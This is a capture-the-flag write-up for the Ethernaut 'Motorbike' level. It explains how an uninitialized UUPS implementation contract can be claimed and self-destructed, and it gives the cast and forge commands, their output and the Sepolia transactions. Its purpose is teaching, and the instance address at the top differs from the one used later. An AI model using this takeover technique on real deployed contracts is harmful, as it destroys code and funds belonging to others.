# Ethernaut Challenge 25 — Motorbike

This challenge introduces a **UUPS-style upgradeable contract** and shows how an **uninitialized implementation contract** can let an attacker take control of the upgrade mechanism.

The goal is to make the `Engine` implementation unusable.

Instance address:

```
0xb6f62be9Eb0bA7226f7137aCB172AB626aE6A267
````

---

## 🎯 Goal

The level is solved when the `Engine` implementation contract is destroyed, making the motorbike unusable.

---

## 🧠 Thought process

The key vulnerability is in the `Motorbike` constructor:

```solidity
(bool success,) = _logic.delegatecall(abi.encodeWithSignature("initialize()"));
```

This line calls `initialize()` on the implementation contract, but it does so through `delegatecall`.

That means:

* the **code** of `Engine.initialize()` is executed
* the **storage** that gets modified is the storage of the **proxy (`Motorbike`)**
* the storage of the standalone `Engine` implementation contract is **not** initialized

So after deployment:

* the **proxy storage** is initialized
* the **implementation storage** is still uninitialized

This is dangerous because the implementation contract still allows anyone to call:

```solidity
initialize()
```

and become the `upgrader`.

---

## 🔍 Step 1 — Verify that the proxy is initialized

The `Engine` contract defines these public variables:

```solidity
address public upgrader;
uint256 public horsePower;
```

If we call these getters on the proxy address, the call is forwarded through the fallback and delegated to the implementation.

So even though `Motorbike` does not explicitly define these variables, the implementation code reads the corresponding slots from **proxy storage**.

Set the instance address:

```bash
MOTORBIKE_SEPOLIA=0x30649a58B74d44A3EDD7c21e29749Cf76542d078
```

Check the `upgrader` through the proxy:

```bash
cast call $MOTORBIKE_SEPOLIA \
  "upgrader()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
```

Check `horsePower` through the proxy:

```bash
cast call $MOTORBIKE_SEPOLIA \
  "horsePower()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
1000
```

This confirms that the proxy storage was initialized.

---

## 🔍 Step 2 — Read the implementation address

The proxy stores the implementation address in the standard **ERC-1967 implementation slot**:

```solidity
0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
```

Read it with `cast storage`:

```bash
cast storage $MOTORBIKE_SEPOLIA \
  0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x00000000000000000000000097ebd8a149fd4a47028f98992f8b760eee5890c6
```

The last 20 bytes are the implementation address:

```bash
ENGINE_SEPOLIA=0x97ebd8a149fd4a47028f98992f8b760eee5890c6
```

---

## 🔍 Step 3 — Prove that the implementation is still uninitialized

Now call the same getters directly on the `Engine` implementation.

Check `upgrader`:

```bash
cast call $ENGINE_SEPOLIA \
  "upgrader()(address)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0x0000000000000000000000000000000000000000
```

Check `horsePower`:

```bash
cast call $ENGINE_SEPOLIA \
  "horsePower()(uint256)" \
  --rpc-url $SEPOLIA_RPC_URL
```

Result:

```bash
0
```

These are the default values for an uninitialized contract.

So the constructor initialized the **proxy**, but not the **implementation**.

That means we can call `initialize()` directly on the implementation and become the `upgrader`.

---

## 🚀 Exploit on Sepolia

We executed the exploit using our automated Foundry script `script/25-Motorbike.s.sol`. The script loads the engine implementation address from proxy storage slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`, initializes the engine directly, deploys `EngineDestroyer`, and calls `upgradeToAndCall` to self-destruct the engine.

Execute it using:
```bash
forge script script/25-Motorbike.s.sol:MotorbikeSolution --rpc-url sepolia --broadcast
```

### 📜 My Transactions

* **EngineDestroyer Contract Deploy**: [0x6dc6323ca3150a28bac0cedf5e57e9c6234f842573035e73a93c883728046d7f](https://sepolia.etherscan.io/tx/0x6dc6323ca3150a28bac0cedf5e57e9c6234f842573035e73a93c883728046d7f)
* **Direct Engine Initialization**: [0x911f367d23bafd99349c1cee2553f62945ada0c7a02c17bb8dd3cc85e20e1bda](https://sepolia.etherscan.io/tx/0x911f367d23bafd99349c1cee2553f62945ada0c7a02c17bb8dd3cc85e20e1bda)
* **Upgrade and Self-destruct**: [0x1a995d97fb571b5c108251989a1fea511a09847b43d97c3873860d91f76d71a6](https://sepolia.etherscan.io/tx/0x1a995d97fb571b5c108251989a1fea511a09847b43d97c3873860d91f76d71a6)
* **Exploit Block**: 10942264

---

## 🛡️ Security Takeaways
* **Never leave implementation contracts uninitialized**: In UUPS proxy configurations, always call `_disableInitializers()` or initialize the implementation logic contract directly during its own deployment to prevent anyone else from taking control.
* **Keep upgrades highly restricted**: Implement robust access controls and ensure critical actions like UUPS upgrades can only be authorized by genuine admins.
* **Be cautious of delegatecalls**: Delegated execution passes control flow completely. Avoid delegatecalling user-supplied/untrusted addresses or methods.
